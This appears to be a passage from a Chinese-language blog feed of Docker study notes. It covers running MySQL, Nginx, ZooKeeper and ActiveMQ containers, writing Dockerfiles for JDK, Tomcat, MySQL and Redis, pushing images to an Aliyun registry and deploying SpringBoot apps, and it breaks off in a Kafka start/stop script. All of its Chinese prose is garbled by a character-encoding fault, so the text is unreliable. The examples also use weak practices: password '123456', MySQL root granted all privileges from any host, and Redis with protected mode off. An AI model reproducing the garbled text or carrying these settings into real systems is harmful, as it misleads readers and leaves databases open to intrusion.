<p>æ ¹æ®æ˜¯å¦æ˜¯å®˜æ–¹æä¾›ï¼Œå¯å°†é•œåƒèµ„æºåˆ†ä¸ºä¸¤ç±»;</p>
<p>ä¸€ç§æ˜¯ç±»ä¼¼ centos è¿™æ ·çš„åŸºç¡€é•œåƒï¼Œè¢«ç§°ä¸ºåŸºç¡€æˆ–æ ¹é•œåƒã€‚è¿™äº›åŸº ç¡€é•œåƒæ˜¯ç”± Docker å…¬å¸åˆ›å»ºã€éªŒè¯ã€æ”¯æŒã€æä¾›ã€‚è¿™æ ·çš„é•œåƒå¾€å¾€ ä½¿ç”¨å•ä¸ªå•è¯ä½œä¸ºåå­—;<br> è¿˜æœ‰ä¸€ç§ç±»å‹ï¼Œæ¯”å¦‚ tianon&#x2F;centos é•œåƒï¼Œå®ƒæ˜¯ç”± Docker çš„ç”¨æˆ·åˆ› å»ºå¹¶ç»´æŠ¤çš„ï¼Œå¾€å¾€å¸¦æœ‰ç”¨æˆ·åç§°å‰ç¼€ã€‚å¯ä»¥é€šè¿‡å‰ç¼€ user_name&#x2F; æ¥ æŒ‡å®šä½¿ç”¨æŸä¸ªç”¨æˆ·æä¾›çš„é•œåƒï¼Œæ¯”å¦‚ tianon ç”¨æˆ·;</p>
<p>å¹¶åˆ©ç”¨ docker pull å‘½ä»¤æ¥å°†å®ƒä¸‹è½½åˆ°æœ¬åœ°:</p>
<p>docker pull rabbitmq </p>
<p>docker pull centos</p>
<h1 id="ç¬¬å››ç« -Docketä½¿ç”¨å®ä¾‹"><a href="#ç¬¬å››ç« -Docketä½¿ç”¨å®ä¾‹" class="headerlink" title="ç¬¬å››ç«  Docketä½¿ç”¨å®ä¾‹"></a>ç¬¬å››ç«  Docketä½¿ç”¨å®ä¾‹</h1><h2 id="4-1-Docker-å®‰è£…-MySQL"><a href="#4-1-Docker-å®‰è£…-MySQL" class="headerlink" title="4.1 Docker å®‰è£… MySQL"></a>4.1 Docker å®‰è£… MySQL</h2><p>#ä¸‹è½½ MySQL é•œåƒ:<br> docker pull mysql:latest (å®‰è£…çš„æ˜¯ mysql 8.0)<br> docker run -p 3306:3306 -e MYSQL_DATABASE&#x3D;workdb -e MYSQL_ROOT_PASSWORD&#x3D;123456 -d mysql:latest<br> å…¶ä¸­-e æ˜¯æŒ‡å®šç¯å¢ƒå˜é‡<br> #è¿›å…¥å®¹å™¨:<br> docker exec -it 3e8bf7392b4e bash<br> #ç™»å½• MySQL:<br> mysql -u root -p<br> #ä¿®æ”¹å¯†ç :<br> ALTER USER â€˜rootâ€˜@â€™localhostâ€™ IDENTIFIED BY â€˜123456â€™; #æˆæƒè¿œç¨‹ç™»å½•è®¿é—®:<br> CREATE USER â€˜wkctoâ€˜@â€™%â€™ IDENTIFIED WITH mysql_native_password BY â€˜123456â€™;<br> GRANT ALL PRIVILEGES ON <em>.</em> TO â€˜ wkctoâ€˜@â€™%â€™;</p>
<h2 id="4-2-Docker-å®‰è£…-Nginx"><a href="#4-2-Docker-å®‰è£…-Nginx" class="headerlink" title="4.2 Docker å®‰è£… Nginx"></a>4.2 Docker å®‰è£… Nginx</h2><p>#ä¸‹è½½ Nginx é•œåƒ:<br> docker pull nginx<br> docker run -d -p 80:80 nginx<br> #è¿›å…¥å®¹å™¨:<br> docker exec -it 3e8bf7392b4e bash<br> #æµè§ˆå™¨è®¿é—® Nginx:<br> <a href="http://192.168.230.128/">http://192.168.230.128:80</a><br> #Nginx éƒ¨ç½²é™æ€ç½‘ç«™:<br> å°† linux çš„æ–‡ä»¶æ‹·è´åˆ° docker å®¹å™¨æŸä¸ªç›®å½•ä¸‹:<br> docker cp &#x2F;root&#x2F;test.html bf8a58328e18:&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html</p>
<h2 id="4-3-Dokcer-å®‰è£…-Zookeeper"><a href="#4-3-Dokcer-å®‰è£…-Zookeeper" class="headerlink" title="4.3 Dokcer å®‰è£… Zookeeper"></a>4.3 Dokcer å®‰è£… Zookeeper</h2><p>#ä¸‹è½½ Zookeeper é•œåƒ:<br> docker pull zookeeper<br> docker run -p 2181:2181 -d zookeeper </p>
<p>#è¿›å…¥å®¹å™¨:<br> docker exec -it 3e8bf7392b4e bash </p>
<p>#å®¢æˆ·ç«¯å·¥å…·è®¿é—® Zookeeper:</p>
<h2 id="4-4-Docker-å®‰è£…-ActiveMQ"><a href="#4-4-Docker-å®‰è£…-ActiveMQ" class="headerlink" title="4.4 Docker å®‰è£… ActiveMQ"></a>4.4 Docker å®‰è£… ActiveMQ</h2><p>#ä¸‹è½½ ActiveMQ é•œåƒ:<br> docker pull webcenter&#x2F;activemq </p>
<p>docker run -p 8161:8161 -d activemq </p>
<p>#è¿›å…¥å®¹å™¨:<br> docker exec -it 3e8bf7392b4e bash </p>
<p>#æµè§ˆå™¨è®¿é—® activemq:</p>
<h1 id="ç¬¬äº”ç« -Docker-è‡ªå®šä¹‰é•œåƒ"><a href="#ç¬¬äº”ç« -Docker-è‡ªå®šä¹‰é•œåƒ" class="headerlink" title="ç¬¬äº”ç«  Docker è‡ªå®šä¹‰é•œåƒ"></a>ç¬¬äº”ç«  Docker è‡ªå®šä¹‰é•œåƒ</h1><h2 id="5-1-è®¤è¯†-Dockerfile-æ–‡ä»¶"><a href="#5-1-è®¤è¯†-Dockerfile-æ–‡ä»¶" class="headerlink" title="5.1 è®¤è¯† Dockerfile æ–‡ä»¶"></a>5.1 è®¤è¯† Dockerfile æ–‡ä»¶</h2><p>Dockerfile ç”¨äºæ„å»º Docker é•œåƒï¼ŒDockerfile æ–‡ä»¶æ˜¯ç”±ä¸€è¡Œè¡Œå‘½ä»¤è¯­å¥ ç»„æˆï¼ŒåŸºäºè¿™äº›å‘½ä»¤å³å¯ä»¥æ„å»ºä¸€ä¸ªé•œåƒï¼Œæ¯”å¦‚ä¸‹é¢å°±æ˜¯ä¸€ä¸ª</p>
<p>Dockefile æ–‡ä»¶æ ·ä¾‹:</p>
<p>FROM XXX&#x2F;jdk:8<br> MAINTAINER docker_user<br> ENV JAVA_HOME &#x2F;usr&#x2F;local&#x2F;java<br> ADD apache-tomcat-8.0.32.tar.gz &#x2F;usr&#x2F;local&#x2F; RUN mv apache-tomcat-8.0.32 tomcat8<br> EXPOSE 8080<br> RUN chmod u+x &#x2F;usr&#x2F;local&#x2F;tomcat8&#x2F;bin&#x2F;*.sh CMD &#x2F;usr&#x2F;local&#x2F;tomcat8&#x2F;bin&#x2F;catalina.sh start</p>
<h2 id="5-2-Dockerfile-çš„åŸºæœ¬ç»“æ„"><a href="#5-2-Dockerfile-çš„åŸºæœ¬ç»“æ„" class="headerlink" title="5.2 Dockerfile çš„åŸºæœ¬ç»“æ„"></a>5.2 Dockerfile çš„åŸºæœ¬ç»“æ„</h2><p>ä¸€èˆ¬çš„ï¼ŒDockerfile åˆ†ä¸ºå››éƒ¨åˆ†:</p>
<ul>
<li>åŸºç¡€é•œåƒä¿¡æ¯;</li>
<li>ç»´æŠ¤è€…ä¿¡æ¯;</li>
<li>é•œåƒæ“ä½œæŒ‡ä»¤;</li>
<li>å®¹å™¨å¯åŠ¨æ—¶æ‰§è¡ŒæŒ‡ä»¤;</li>
</ul>
<h2 id="5-3-Dockerfile-æŒ‡ä»¤"><a href="#5-3-Dockerfile-æŒ‡ä»¤" class="headerlink" title="5.3 Dockerfile æŒ‡ä»¤"></a>5.3 Dockerfile æŒ‡ä»¤</h2><p><strong>FROM</strong></p>
<p>æ ¼å¼ä¸º FROM <image> æˆ– FROM <image>:<tag><br> Dockerfile æ–‡ä»¶çš„ç¬¬ä¸€æ¡æŒ‡ä»¤å¿…é¡»ä¸º FROM æŒ‡ä»¤ã€‚å¹¶ä¸”ï¼Œå¦‚æœåœ¨åŒä¸€ ä¸ª Dockerfile ä¸­åˆ›å»ºå¤šä¸ªé•œåƒæ—¶ï¼Œå¯ä»¥ä½¿ç”¨å¤šä¸ª FROM æŒ‡ä»¤(æ¯ä¸ªé•œ åƒä¸€æ¬¡);<br> **MAINTAINER<br>** æ ¼å¼ä¸º MAINTAINER <name>ï¼ŒæŒ‡å®šç»´æŠ¤è€…ä¿¡æ¯;<br> **ENV<br>** æ ¼å¼ä¸º ENV <key> <value>ï¼ŒæŒ‡å®šä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œä¼šè¢«åç»­ RUN æŒ‡ä»¤ ä½¿ç”¨ï¼Œå¹¶åœ¨å®¹å™¨è¿è¡Œæ—¶ä¿æŒ;<br> **ADD<br>** æ ¼å¼ä¸º ADD <src> <dest>;<br> å¤åˆ¶æŒ‡å®šçš„<src>åˆ°å®¹å™¨ä¸­çš„<dest>;<br> **EXPOSE<br>** æ ¼å¼ä¸º EXPOSE <port> [<port>â€¦]</p>
<p>å‘Šè¯‰ Docker æœåŠ¡ç«¯å®¹å™¨æš´éœ²çš„ç«¯å£å·ï¼Œä¾›äº’è”ç³»ç»Ÿä½¿ç”¨ï¼Œåœ¨å¯åŠ¨å®¹ å™¨æ—¶éœ€è¦é€šè¿‡ -pæ˜ å°„ç«¯å£ï¼ŒDocker ä¸»æœºä¼šè‡ªåŠ¨åˆ†é…ä¸€ä¸ªç«¯å£è½¬å‘åˆ° æŒ‡å®šçš„ç«¯å£;<br> <strong>RUN</strong></p>
<p>æ ¼å¼ä¸º RUN <command><br> RUN æŒ‡ä»¤å°†åœ¨å½“å‰é•œåƒåŸºç¡€ä¸Šæ‰§è¡ŒæŒ‡å®šå‘½ä»¤ï¼Œå¹¶æäº¤ä¸ºæ–°çš„é•œåƒï¼Œ å½“å‘½ä»¤è¾ƒé•¿æ—¶å¯ä»¥ä½¿ç”¨ \ æ¥æ¢è¡Œ;<br> **CMD<br>** æŒ‡å®šå¯åŠ¨å®¹å™¨æ—¶æ‰§è¡Œçš„å‘½ä»¤ï¼Œæ¯ä¸ª Dockerfile åªèƒ½æœ‰ä¸€æ¡ CMD å‘½ä»¤ã€‚ å¦‚æœæŒ‡å®šäº†å¤šæ¡å‘½ä»¤ï¼Œåªæœ‰æœ€åä¸€æ¡ä¼šè¢«æ‰§è¡Œã€‚ å¦‚æœç”¨æˆ·å¯åŠ¨å®¹å™¨æ—¶å€™æŒ‡å®šäº†è¿è¡Œçš„å‘½ä»¤ï¼Œåˆ™ä¼šè¦†ç›–æ‰ CMD æŒ‡å®šçš„ å‘½ä»¤ã€‚</p>
<h2 id="5-4-Dockerfile-è‡ªå®šä¹‰é•œåƒ"><a href="#5-4-Dockerfile-è‡ªå®šä¹‰é•œåƒ" class="headerlink" title="5.4 Dockerfile è‡ªå®šä¹‰é•œåƒ"></a>5.4 Dockerfile è‡ªå®šä¹‰é•œåƒ</h2><h3 id="5-4-1-è‡ªå®šä¹‰-JDK-é•œåƒ"><a href="#5-4-1-è‡ªå®šä¹‰-JDK-é•œåƒ" class="headerlink" title="5.4.1 è‡ªå®šä¹‰ JDK é•œåƒ"></a>5.4.1 è‡ªå®šä¹‰ JDK é•œåƒ</h3><p>FROM centos:latest<br> MAINTAINER wkcto<br> ADD jdk-8u121-linux-x64.tar.gz &#x2F;usr&#x2F;local<br> ENV JAVA_HOME &#x2F;usr&#x2F;local&#x2F;jdk1.8.0_121<br> ENV CLASSPATH $JAVA_HOME&#x2F;lib&#x2F;dt.jar:$JAVA_HOME&#x2F;lib&#x2F;tools.jar ENV PATH $PATH:$JAVA_HOME&#x2F;bin<br> CMD java -version</p>
<p>æ„å»ºé•œåƒ:docker build -t wkcto_jdk1.8.0_121 . </p>
<p>è¿è¡Œé•œåƒ:docker run -d ac84bde53958</p>
<h3 id="5-4-2-è‡ªå®šä¹‰-Tomcat-é•œåƒ"><a href="#5-4-2-è‡ªå®šä¹‰-Tomcat-é•œåƒ" class="headerlink" title="5.4.2 è‡ªå®šä¹‰ Tomcat é•œåƒ"></a>5.4.2 è‡ªå®šä¹‰ Tomcat é•œåƒ</h3><p>å®šä¹‰ Dockerfile æ–‡ä»¶:</p>
<p>FROM wkcto_jdk1.8.0_121<br> MAINTAINER wkcto<br> ADD apache-tomcat-8.5.24.tar.gz &#x2F;usr&#x2F;local&#x2F;<br> ENV CATALINA_HOME &#x2F;usr&#x2F;local&#x2F;apache-tomcat-8.5.24<br> ENV PATH $PATH:$CATALINA_HOME&#x2F;lib:$CATALINA_HOME&#x2F;bin EXPOSE 8080<br> CMD &#x2F;usr&#x2F;local&#x2F;apache-tomcat-8.5.24&#x2F;bin&#x2F;catalina.sh run</p>
<p>æ„å»ºé•œåƒ:docker build -t wkcto-tomcat-8.5.24 . </p>
<p>è¿è¡Œé•œåƒ:docker run -d -p 8080:8080 ab41b5f48256</p>
<h3 id="5-4-3-è‡ªå®šä¹‰-MySQL-é•œåƒ"><a href="#5-4-3-è‡ªå®šä¹‰-MySQL-é•œåƒ" class="headerlink" title="5.4.3 è‡ªå®šä¹‰ MySQL é•œåƒ"></a>5.4.3 è‡ªå®šä¹‰ MySQL é•œåƒ</h3><p>å®šä¹‰ Dockerfile æ–‡ä»¶:</p>
<p>FROM centos:centos6<br> MAINTAINER wkcto<br> RUN yum install mysql-server mysql -y RUN &#x2F;etc&#x2F;init.d&#x2F;mysqld start &amp;&amp;\</p>
<p>mysql -e â€œgrant all privileges on <em>.</em> to â€˜rootâ€˜@â€™%â€™ identified by â€˜123456â€™ WITH GRANT OPTION ;â€&amp;&amp;\</p>
<p>mysql -e â€œgrant all privileges on <em>.</em> to â€˜rootâ€˜@â€™localhostâ€™ identified by â€˜123456â€™ WITH GRANT OPTION ;â€&amp;&amp;\</p>
<p>mysql -uroot -p123456 -e â€œshow databases;â€ EXPOSE 3306</p>
<p>CMD &#x2F;usr&#x2F;bin&#x2F;mysqld_safe </p>
<p>æ„å»ºé•œåƒ:docker build -t wkcto-mysql .</p>
<p>è¿è¡Œé•œåƒ:docker run -d -p 3306:3306 09ce279d92df </p>
<h3 id="5-4-4-è‡ªå®šä¹‰-Redis-é•œåƒ"><a href="#5-4-4-è‡ªå®šä¹‰-Redis-é•œåƒ" class="headerlink" title="5.4.4 è‡ªå®šä¹‰ Redis é•œåƒ"></a>5.4.4 è‡ªå®šä¹‰ Redis é•œåƒ</h3><p> å®šä¹‰ Dockerfile æ–‡ä»¶:</p>
<p>FROM centos:latest<br> MAINTAINER wkcto<br> RUN yum install epel-release -y &amp;&amp; yum install redis -y &amp;&amp; yum install net-tools -y EXPOSE 6379<br> CMD &#x2F;usr&#x2F;bin&#x2F;redis-server â€“protected-mode no</p>
<p>æ„å»ºé•œåƒ:docker build -t wkcto-redis . </p>
<p>è¿è¡Œé•œåƒ:docker run -d -p 6379:6379 390583cf0531</p>
<h2 id="5-5-é•œåƒå‘å¸ƒåˆ°ä»“åº“"><a href="#5-5-é•œåƒå‘å¸ƒåˆ°ä»“åº“" class="headerlink" title="5.5 é•œåƒå‘å¸ƒåˆ°ä»“åº“"></a>5.5 é•œåƒå‘å¸ƒåˆ°ä»“åº“</h2><h3 id="5-5-1-é˜¿é‡Œäº‘å®¹å™¨é•œåƒä»“åº“"><a href="#5-5-1-é˜¿é‡Œäº‘å®¹å™¨é•œåƒä»“åº“" class="headerlink" title="5.5.1 é˜¿é‡Œäº‘å®¹å™¨é•œåƒä»“åº“"></a>5.5.1 é˜¿é‡Œäº‘å®¹å™¨é•œåƒä»“åº“</h3><p>ç½‘å€:<a href="https://dev.aliyun.com/">https://dev.aliyun.com</a></p>
<h3 id="5-5-2-æ³¨å†Œé˜¿é‡Œäº‘é•œåƒä»“åº“"><a href="#5-5-2-æ³¨å†Œé˜¿é‡Œäº‘é•œåƒä»“åº“" class="headerlink" title="5.5.2 æ³¨å†Œé˜¿é‡Œäº‘é•œåƒä»“åº“"></a>5.5.2 æ³¨å†Œé˜¿é‡Œäº‘é•œåƒä»“åº“</h3><p>å¦‚æœæ²¡æœ‰é˜¿é‡Œäº‘è´¦å·ï¼Œéœ€è¦æ³¨å†Œä¸€ä¸ªé˜¿é‡Œäº‘è´¦å·; ä¹Ÿå¯ä»¥ä½¿ç”¨æ·˜å®è´¦å·ã€æ”¯ä»˜å®è´¦å·ç™»å½•;</p>
<h3 id="5-5-3-å‘å¸ƒé•œåƒé˜¿é‡Œäº‘é•œåƒä»“åº“"><a href="#5-5-3-å‘å¸ƒé•œåƒé˜¿é‡Œäº‘é•œåƒä»“åº“" class="headerlink" title="5.5.3 å‘å¸ƒé•œåƒé˜¿é‡Œäº‘é•œåƒä»“åº“"></a>5.5.3 å‘å¸ƒé•œåƒé˜¿é‡Œäº‘é•œåƒä»“åº“</h3><p>ç™»å½•é˜¿é‡Œäº‘é•œåƒï¼Œè¿›å…¥ç®¡ç†ä¸­å¿ƒï¼Œåœ¨è‡ªå·±æˆ‘ç®¡ç†ä¸­å¿ƒä¸­ï¼Œå·¦ä¾§ç‚¹å‡»é•œ åƒä»“åº“èœå•ï¼Œå¦‚æœè‡ªå·±æ²¡æœ‰é•œåƒä»“åº“çš„è¯ï¼Œéœ€è¦åˆ›å»ºä¸€ä¸ªé•œåƒä»“åº“; å¯¹è‡ªå·±çš„é•œåƒä»“åº“ç‚¹å‡»ç®¡ç†é“¾æ¥ï¼ŒæŒ‰ç…§æ“ä½œæŒ‡å—è¿›è¡Œæ“ä½œå³å¯;</p>
<ol>
<li><p>ç™»å½•é˜¿é‡Œäº‘ Docker Registry</p>
<p>docker login --username&#x3D;<a href="mailto:&#x68;&#x69;&#51;&#x35;&#x33;&#51;&#49;&#55;&#x31;&#x30;&#64;&#97;&#x6c;&#105;&#121;&#117;&#x6e;&#46;&#x63;&#111;&#x6d;">&#x68;&#x69;&#51;&#x35;&#x33;&#51;&#49;&#55;&#x31;&#x30;&#64;&#97;&#x6c;&#105;&#121;&#117;&#x6e;&#46;&#x63;&#111;&#x6d;</a> registry.cn-qingdao.aliyuncs.com</p>
<p>ç”¨äºç™»å½•çš„ç”¨æˆ·åä¸ºé˜¿é‡Œäº‘è´¦å·å…¨åï¼Œå¯†ç ä¸ºå¼€é€šæœåŠ¡æ—¶è®¾ç½®çš„å¯†ç ã€‚ æ‚¨å¯ä»¥åœ¨äº§å“æ§åˆ¶å°é¦–é¡µä¿®æ”¹ç™»å½•å¯†ç ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212131397.png" alt="image-20201217011107880"></p>
</li>
<li><p>å°†é•œåƒæ¨é€åˆ° Registry</p>
</li>
</ol>
<p>docker tag [ImageId] registry.cn-qingdao.aliyuncs.com&#x2F;123test&#x2F;1234test:[ é•œ åƒ ç‰ˆ æœ¬ å· ] docker push registry.cn-qingdao.aliyuncs.com&#x2F;123test&#x2F;1234test:[é•œåƒç‰ˆæœ¬å·] </p>
<p>è¯·æ ¹æ®å®é™…é•œåƒä¿¡æ¯æ›¿æ¢ç¤ºä¾‹ä¸­çš„[ImageId]å’Œ[é•œåƒç‰ˆæœ¬å·]å‚æ•°ã€‚</p>
<p>imageId: a78da0202f84</p>
<p>docker tag a78da0202f84 registry.cn-qingdao.aliyuncs.com&#x2F;123test&#x2F;1234test:latest docker push registry.cn-qingdao.aliyuncs.com&#x2F;123test&#x2F;1234test:latest</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212131398.png" alt="image-20201217011146337"></p>
<h3 id="5-5-4-Docker-hub-é•œåƒåŠ é€Ÿ"><a href="#5-5-4-Docker-hub-é•œåƒåŠ é€Ÿ" class="headerlink" title="5-5-4 Docker hub é•œåƒåŠ é€Ÿ"></a>5-5-4 Docker hub é•œåƒåŠ é€Ÿ</h3><p>&#x2F;etc&#x2F;docker&#x2F;daemon.json</p>
<p>{â€œregistry-mirrorsâ€: [â€œ<a href="https://gg3gwnry.mirror.aliyuncs.com&quot;]}">https://gg3gwnry.mirror.aliyuncs.com&quot;]}</a></p>
<h1 id="ç¬¬å…­ç« -Docker-åº”ç”¨éƒ¨ç½²"><a href="#ç¬¬å…­ç« -Docker-åº”ç”¨éƒ¨ç½²" class="headerlink" title="ç¬¬å…­ç«  Docker åº”ç”¨éƒ¨ç½²"></a>ç¬¬å…­ç«  Docker åº”ç”¨éƒ¨ç½²</h1><h2 id="6-1-éƒ¨ç½²ä¸€ä¸ª-SpringBoot-é¡¹ç›®"><a href="#6-1-éƒ¨ç½²ä¸€ä¸ª-SpringBoot-é¡¹ç›®" class="headerlink" title="6.1 éƒ¨ç½²ä¸€ä¸ª SpringBoot é¡¹ç›®"></a>6.1 éƒ¨ç½²ä¸€ä¸ª SpringBoot é¡¹ç›®</h2><ol>
<li><p>å°†å¼€å‘çš„ springboot ç¨‹åºæ‰“æˆ jar åŒ…æˆ–è€… war åŒ…;</p>
</li>
<li><p>å°†æ‰“å¥½çš„ jar åŒ…æˆ– war åŒ…ä¸Šä¼ åˆ° Linux æŸä¸ªç›®å½•ä¸‹ï¼Œæ¯”å¦‚:&#x2F;root&#x2F;docker</p>
</li>
<li><p>å®šä¹‰ Dockerfile æ–‡ä»¶ï¼Œç”¨äºåˆ›å»ºé¡¹ç›®é•œåƒ;</p>
</li>
</ol>
<h2 id="6-2-Docker-éƒ¨ç½²-Jar-åŒ…-SpringBoot-ç¨‹åº"><a href="#6-2-Docker-éƒ¨ç½²-Jar-åŒ…-SpringBoot-ç¨‹åº" class="headerlink" title="6-2 Docker éƒ¨ç½² Jar åŒ… SpringBoot ç¨‹åº"></a>6-2 Docker éƒ¨ç½² Jar åŒ… SpringBoot ç¨‹åº</h2><h3 id="6-2-1-å®šä¹‰-Jar-åŒ…ç¨‹åº-Dockerfile-æ–‡ä»¶"><a href="#6-2-1-å®šä¹‰-Jar-åŒ…ç¨‹åº-Dockerfile-æ–‡ä»¶" class="headerlink" title="6-2-1 å®šä¹‰ Jar åŒ…ç¨‹åº Dockerfile æ–‡ä»¶"></a>6-2-1 å®šä¹‰ Jar åŒ…ç¨‹åº Dockerfile æ–‡ä»¶</h3><p>FROM wkcto_jdk1.8.0_121<br> MAINTAINER wkcto<br> ADD springboot-web-1.0.0.jar &#x2F;opt<br> RUN chmod +x &#x2F;opt&#x2F;springboot-web-1.0.0.jar CMD java -jar &#x2F;opt&#x2F;springboot-web-1.0.0.jar</p>
<h3 id="6-2-2-æ„å»ºå’Œè¿è¡Œ-Jar-åŒ…ç¨‹åºçš„é•œåƒ"><a href="#6-2-2-æ„å»ºå’Œè¿è¡Œ-Jar-åŒ…ç¨‹åºçš„é•œåƒ" class="headerlink" title="6-2-2 æ„å»ºå’Œè¿è¡Œ Jar åŒ…ç¨‹åºçš„é•œåƒ"></a>6-2-2 æ„å»ºå’Œè¿è¡Œ Jar åŒ…ç¨‹åºçš„é•œåƒ</h3><p>æ„å»ºé•œåƒ:docker build -t springboot-web-jar .</p>
<p>è¿è¡Œå®¹å™¨:docker run -d ac84bde53958</p>
<h3 id="6-2-3-Jar-åŒ…ç¨‹åºä¾èµ–å®¹å™¨ç¯å¢ƒå‡†å¤‡"><a href="#6-2-3-Jar-åŒ…ç¨‹åºä¾èµ–å®¹å™¨ç¯å¢ƒå‡†å¤‡" class="headerlink" title="6-2-3 Jar åŒ…ç¨‹åºä¾èµ–å®¹å™¨ç¯å¢ƒå‡†å¤‡"></a>6-2-3 Jar åŒ…ç¨‹åºä¾èµ–å®¹å™¨ç¯å¢ƒå‡†å¤‡</h3><p>è¿è¡Œ Redis å®¹å™¨:docker run -p 6379:6379 -d redis</p>
<p>è¿è¡Œ MySQL å®¹å™¨:docker run -p 3306:3306 -e MYSQL_DATABASE&#x3D;workdb -e MYSQL_ROOT_PASSWORD&#x3D;123456 -d mysql:latest<br> **ä¿®æ”¹å®¹å™¨ä¿å­˜:**docker commit å®¹å™¨ id xxx(é•œåƒå:tagxxx)</p>
<p>æ¯”å¦‚:docker commit b034f6d23833 wkcto_mysql_new </p>
<h3 id="6-2-4-è¿è¡Œ-Docker-åŒ–çš„-Jar-åŒ…ç¨‹åº"><a href="#6-2-4-è¿è¡Œ-Docker-åŒ–çš„-Jar-åŒ…ç¨‹åº" class="headerlink" title="6-2-4 è¿è¡Œ Docker åŒ–çš„ Jar åŒ…ç¨‹åº"></a>6-2-4 è¿è¡Œ Docker åŒ–çš„ Jar åŒ…ç¨‹åº</h3><p>é€šè¿‡ windows çš„æµè§ˆå™¨è®¿é—®ï¼ŒéªŒè¯ SpringBoot é¡¹ç›®æ˜¯å¦å¯ä»¥æ­£å¸¸è®¿é—®;</p>
<h2 id="6-3-Docker-éƒ¨ç½²-War-åŒ…-SpringBoot-ç¨‹åº"><a href="#6-3-Docker-éƒ¨ç½²-War-åŒ…-SpringBoot-ç¨‹åº" class="headerlink" title="6-3 Docker éƒ¨ç½² War åŒ… SpringBoot ç¨‹åº"></a>6-3 Docker éƒ¨ç½² War åŒ… SpringBoot ç¨‹åº</h2><h3 id="6-3-1-å®šä¹‰-War-åŒ…ç¨‹åº-Dockerfile-æ–‡ä»¶"><a href="#6-3-1-å®šä¹‰-War-åŒ…ç¨‹åº-Dockerfile-æ–‡ä»¶" class="headerlink" title="6-3-1 å®šä¹‰ War åŒ…ç¨‹åº Dockerfile æ–‡ä»¶"></a>6-3-1 å®šä¹‰ War åŒ…ç¨‹åº Dockerfile æ–‡ä»¶</h3><p>FROM wkcto-tomcat-8.5.24<br> MAINTAINER wkcto<br> ADD springboot-web-1.0.0.war &#x2F;usr&#x2F;local&#x2F;apache-tomcat-8.5.24&#x2F;webapps EXPOSE 8080<br> CMD &#x2F;usr&#x2F;local&#x2F;apache-tomcat-8.5.24&#x2F;bin&#x2F;catalina.sh run</p>
<h3 id="6-3-2-æ„å»ºå’Œè¿è¡Œ-War-åŒ…ç¨‹åºçš„é•œåƒ"><a href="#6-3-2-æ„å»ºå’Œè¿è¡Œ-War-åŒ…ç¨‹åºçš„é•œåƒ" class="headerlink" title="6-3-2 æ„å»ºå’Œè¿è¡Œ War åŒ…ç¨‹åºçš„é•œåƒ"></a>6-3-2 æ„å»ºå’Œè¿è¡Œ War åŒ…ç¨‹åºçš„é•œåƒ</h3><p>æ„å»ºé•œåƒ:docker build -t springboot-web-war .</p>
<h3 id="6-3-3-War-åŒ…ç¨‹åºä¾èµ–å®¹å™¨ç¯å¢ƒå‡†å¤‡"><a href="#6-3-3-War-åŒ…ç¨‹åºä¾èµ–å®¹å™¨ç¯å¢ƒå‡†å¤‡" class="headerlink" title="6-3-3 War åŒ…ç¨‹åºä¾èµ–å®¹å™¨ç¯å¢ƒå‡†å¤‡"></a>6-3-3 War åŒ…ç¨‹åºä¾èµ–å®¹å™¨ç¯å¢ƒå‡†å¤‡</h3><p>ä¸ä¸Šé¢éƒ¨ç½² Jar ç¨‹åºä¾èµ–çš„å®¹å™¨ç¯å¢ƒä¸€æ ·;</p>
<h3 id="6-3-4-è¿è¡Œ-Docker-åŒ–çš„-War-åŒ…ç¨‹åº"><a href="#6-3-4-è¿è¡Œ-Docker-åŒ–çš„-War-åŒ…ç¨‹åº" class="headerlink" title="6-3-4 è¿è¡Œ Docker åŒ–çš„ War åŒ…ç¨‹åº"></a>6-3-4 è¿è¡Œ Docker åŒ–çš„ War åŒ…ç¨‹åº</h3><p>é€šè¿‡ windows çš„æµè§ˆå™¨è®¿é—®ï¼ŒéªŒè¯ SpringBoot é¡¹ç›®æ˜¯å¦å¯ä»¥æ­£å¸¸è®¿é—®; springboot-web-1.0.0.war â†’ springboot-web-1.0.0</p>
]]></content>
      <categories>
        <category>é¢è¯•</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Kafka</title>
    <url>/2021/12/21/%E9%9D%A2%E8%AF%95/Kafka/</url>
    <content><![CDATA[<h1 id="Kafka"><a href="#Kafka" class="headerlink" title="Kafka"></a>Kafka</h1><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203012100807.png" alt="image-20211018200516549"></p>
<ul>
<li><p>æ¶ˆè´¹è€…ç»„æå‡æ¶ˆè´¹èƒ½åŠ›ï¼Œå¦‚æœæ¶ˆè´¹è€…ç»„å†…çš„æ¶ˆè´¹è€…æ•°å¤§äºpartitionæ•°å°±æ²¡æœ‰æ„ä¹‰äº†ï¼Œå¹¶å‘åº¦æœ€å¥½çš„æ—¶å€™æ˜¯æ¶ˆè´¹è€…å’Œåˆ†åŒºæ•°ä¸€æ ·çš„æ—¶å€™ã€‚</p>
</li>
<li><p>æ¶ˆè´¹è€…å·²æ‹‰å–çš„æ–¹å¼é€šä¿¡ã€‚</p>
</li>
<li><p>followeråªèƒ½åœ¨leaderæŒ‚äº†çš„æ—¶å€™æ‰æœ‰ç”¨ï¼Œå…¶ä»–æ—¶å€™åªæ˜¯ä¸€ä¸ªå¤‡ä»½</p>
</li>
<li><p>Kafkaçš„æ¶ˆæ¯å­˜åœ¨ç£ç›˜ï¼Œä¸€èˆ¬å­˜7å¤©</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">case $1 in</span><br><span class="line">&quot;start&quot;)&#123;</span><br><span class="line">        for i in hadoop102 hadoop103 hadoop104</span><br><span class="line">        do</span><br><span class="line">        echo &quot;===========$i start kafka===========&quot;</span><br><span class="line">        ssh $i &#x27;/opt/module/kafka/bin/kafka-server-start.sh -daemon /opt/module/kafka/config/server.properties&#x27;</span><br><span class="line">        done</span><br><span class="line">&#125;;;</span><br><span class="line"></span><br><span class="line">&quot;stop&quot;)&#123;</span><br><span class="line">        for i in hadoop102 hadoop103 hadoop104</span><br><span class="line">        do</span><br><span class="line">        echo &quot;===========$i stop kafka===========&quot;</span><br><span class="line">        ssh $i &#x27;/opt/module/kafka/bin/kafka-server-stop.sh 